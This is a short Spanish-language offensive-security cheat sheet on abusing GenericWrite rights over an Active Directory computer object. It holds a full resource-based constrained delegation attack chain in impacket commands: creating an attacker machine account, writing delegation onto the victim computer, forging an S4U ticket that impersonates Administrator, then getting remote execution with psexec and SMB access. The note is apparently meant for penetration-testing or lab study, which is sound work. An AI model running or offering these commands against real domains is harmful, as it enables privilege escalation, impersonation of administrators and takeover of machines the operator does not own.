# Abuso ACL 

Tags: #AD #ACL #Linux #RBCD 

## GenericWrite sobre Computador

* [Abusin-AD-ACLs-ACEs](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [HackTricks-Abusing-AD-ACLs-ACE](https://book.hacktricks.xyz/es/windows-hardening/active-directory-methodology/acl-persistence-abuse)

Si tenemos esta ACL sobre un objeto Computer, permite la creación de un Computer y continuar con RBCD.

```bash 
# Abuso de RBCD 
# Crear la cuenta de máquina atacante 
❯ impacket-addcomputer -computer-name 'ATTACKERSYSTEM$' -computer-pass 'P@$$w0rd123!' -dc-host IP_DC -domain-netbios NetBIOS_Name 'domain.local/ControlledAccount' -hashes ':NT'
	
	# -computer-name = Nombre de la cuenta de computadora que se va a crear
	# -computer-pass = Contraseña que tendrá la cuenta de computadora creada
	# -dc-host = IP o hostname del Domain Controller
	# -domain-netbios = Nombre NetBIOS del dominio
	# CONTROLLED_ACCOUNT = Usuario que tiene GenericWrite/GenericAll sobre el Computer víctima
	# NT_HASH = Hash NT del usuario CONTROLLED_ACCOUNT

# Configurar RBCD sobre PC1$ (O sea la cuenta de máquina víctima)
❯ impacket-rbcd -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'PC1$' -action write -dc-ip IP_DC 'domain.local/ControlledAccount' -hashes ':NT' 

	# -delegate-from = Cuenta de computadora controlada por nosotros
	# -delegate-to = Cuenta de computadora víctima sobre la que tenemos GenericWrite/GenericAll
	# -action write = Escribir la configuración RBCD

# Verificar el RBCD
❯ impacket-rbcd -delegate-to 'PC1$' -action read -dc-ip IP_DC 'domain.local/ControlledAccount' -hashes ':NT' 

	# -delegate-to = Computer víctima sobre el que queremos comprobar RBCD
	# -action read = Leer la configuración RBCD

# Obtener el ticket S4U impersonando el usuario Administrador 
❯ impacket-getST -spn 'cifs/FQDN' -impersonate 'Administrator' -dc-ip IP_DC 'domain.local/ATTACKERSYSTEM$:P@$$w0rd123!'

	# -spn = SPN del servicio al que queremos acceder
	# -impersonate = Usuario que queremos impersonar

❯ ls *.ccache  # Mostrar el nombre exacto del ticket generado
❯ export KRB5CCNAME="$(pwd)/NOMBRE_DEL_TICKET.ccache"    # Importar el ticket a Kali 
	# KRB5CCNAME = Ruta del ticket Kerberos que queremos utilizar
❯ klist        # Mostrar los tickets Kerberos cargados
```

```bash 
# Ejecución remota 
❯ impacket-psexec -k -no-pass 'domain.local/Administrator@FQDN'
	
	# -k = Utilizar autenticación Kerberos
	# -no-pass = No solicitar contraseña; utilizar el ticket .ccache
	# Administrator = Usuario impersonado

# Acceder por SMB 
❯ impacket-smbclient -k -no-pass 'domain.local/Administrator@FQDN'
```